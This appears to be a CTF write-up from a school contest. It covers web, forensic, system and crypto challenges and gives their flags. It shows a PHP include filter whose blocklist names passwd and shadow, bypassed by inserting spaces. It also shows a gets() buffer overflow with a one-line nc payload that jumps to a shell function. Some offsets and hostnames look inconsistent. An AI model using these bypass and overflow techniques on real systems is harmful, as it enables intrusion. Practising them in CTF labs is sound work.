# Web

## **bypass\_filter**

If open main page, there is a page list including `a.gif`, `bypass.php`, `flag.php`.  
In `a.gif`, it opens gif file but nothing in `flag.php`.  

There is a form in `bypass.php`.
If you put `flag.php` in form, it says "nope~.~!"

---
```php
<?php

if (isset($_GET['test'])) {
    if (preg_match("/^.*(flag|etc|test|passwd|group|shadow|php|ini|sql|index).*$/im", $_GET['test'])) {
        $message = "nope ~.~! 안전하지 않은 파일 요청입니다.";
    } else if ($_GET['test'] === "phpinfo") {
        ob_start();
        phpinfo();
        $phpinfo = ob_get_clean();
    } else {
        include "./" . str_replace(" ", "", $_GET['test'] . ".php");
    }
}
?>
```
It detects specific strings by `preg_match`, but this code replace blank (space) to empty.  
So, if send "fl ag", you can get the flag  

`FLAG{lev3l_99_filt3r_byp4ss}`


# Forensic
## **건덕이는 포렌식고수**
`Secret.png` file is given.  
If you extract hex with 010 Editor, you can see hint at the end of binary.  
> I recommend increasing the vertical size

If you increase height in `ihdr` region, you can see Flag in the picture.  

`FLAG{1t_is_a_h!dd6n_sec7et_!nMYsch00l}`


## **못 찾겠지? 못찾겠쥐**
a file that has docx extension specifier is given.  
But it cannot be open with error, so if you open it with 010 editor, it says this file is PK format.  

If you change hex `09 08` to `08 08` in Flags Bit region to decrypt PK file.


# System
## **축제용사건국이의 먹거리탈취작전**
```python
void get_shell() {
    char* shell= "/bin/sh";
    char* args[2];

    args[0] = shell;
    args[1] = NULL;

    execve("/bin/sh", args, NULL);
}

void exec_func() {
    char buf[0x30];
    int key = 0x0badf00d;
    printf("번호표를 보여주세요: ");
    gets(buf);

    if (key == 0xf1e1d00d) {
        printf("Nice Try!");
    }

    else {
        printf("Access Denied!");
    }
}
```
Using `gets`, buffer overflow can be occured.  
The offset between return address and buf address is 48.  

```python
(python3 -c "import sys; sys.stdout.buffer.write(b'A'*0x48+b'\xa8\x12\x40\x00\x00\x00')";cat) | nc.rbp.rip 9006
```

# Crypto
## **쿠가 가져간 열쇠**
```python
secret_key = bytes([rnd.randint(0, 2**8) for _ in range(32)])


with open('flag.txt', 'rb') as file:
    data = file.read()
secret_info = data

def result(info, secret_key):
    encryptor = AAEESS.new(secret_key, AAEESS.MODE_ECB)
    encrypted = encryptor.encrypt(Padding.pad(info, AAEESS.block_size))
    with open('result.txt', 'w') as file:
        file.write(encrypted.hex())

result(secret_info, secret_key)
```
It is simple AES chall.
```python
import importlib
import random as rnd

AAEESS = importlib.import_module('Crypto.Cipher.AES')
Padding = importlib.import_module('Crypto.Util.Padding')

rnd.seed('''

@@@

''')
secret_key = bytes([rnd.randint(0, 2**8) for _ in range(32)])

reselt = "6b8204ab9f4924b96ff2eaa4c3c7e85fd6151b34f2c558434c4f610d7a4c066e"

from Crypto.Cipher import AES
from Crypto.Util import Padding

encrypted_hex = "6b8204ab9f4924b96ff2eaa4c3c7e85fd6151b34f2c558434c4f610d7a4c066e"

encrypted = bytes.fromhex(encrypted_hex)

decryptor = AES.new(secret_key, AES.MODE_ECB)
decrypted = Padding.unpad(decryptor.decrypt(encrypted), AES.block_size)

print("Decrypted data:", decrypted.decode())
```
`FLAG{H1de_The_Key_0f_A3S_AES}`